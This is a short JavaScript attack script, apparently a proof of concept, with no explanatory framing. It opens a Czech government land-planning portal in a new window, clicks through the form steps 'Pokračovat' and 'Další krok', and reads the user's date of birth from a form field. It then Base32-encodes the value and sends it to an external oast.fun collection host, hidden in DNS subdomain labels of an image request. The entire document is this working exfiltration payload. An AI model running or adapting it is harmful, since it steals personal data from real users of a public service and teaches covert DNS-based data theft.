(() => {
  const target = 'https://uzemniplanovani.gov.cz/zadost-o-zapis-zmenu-zapisu-v-seznamu-opravnenych-investoru';
  const win = window.open(target, '_blank');
  if (!win) return;                             // popup blocked

  const buttons = ['Pokračovat', 'Další krok'];
  let idx = 0;

  const poll = setInterval(() => {
    try {
      const d = win.document;
      if (d.readyState !== 'complete') return;

      const b = [...d.querySelectorAll('button')]
                 .find(el => el.textContent.trim() === buttons[idx]);
      if (b) {
        b.click();
        if (++idx === buttons.length) {
          clearInterval(poll);
          setTimeout(() => exfiltrate(d), 1000); // wait for final render
        }
      }
    } catch (_) { /* cross‑origin until load completes */ }
  }, 500);

  // RFC 4648 Base‑32 (no padding, lowercase)
  function b32(str) {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz234567';
    let bits = '';
    for (const c of str) bits += c.codePointAt(0).toString(2).padStart(8, '0');
    let out = '';
    for (let i = 0; i < bits.length; i += 5) {
      const chunk = bits.slice(i, i + 5).padEnd(5, '0');
      out += alphabet[parseInt(chunk, 2)];
    }
    return out;
  }

  function exfiltrate(doc) {
    const input = doc.querySelector('ngup-input[inputname="dateOfBirth"] gov-form-input');
    if (!input) return;

    const dob      = input.getAttribute('value') || '';
    const encoded  = b32(dob);
    const labels   = encoded.match(/.{1,63}/g) || [];           // DNS label limit
    const host     = labels.join('.') + '.ulbekehktfjpqmsmzltmpok2y1z095p2x.oast.fun';
    
    console.log(host)

    const img = new Image();
    img.src = 'https://' + host;                                // data in subdomain
    document.body.appendChild(img);
  }
})();
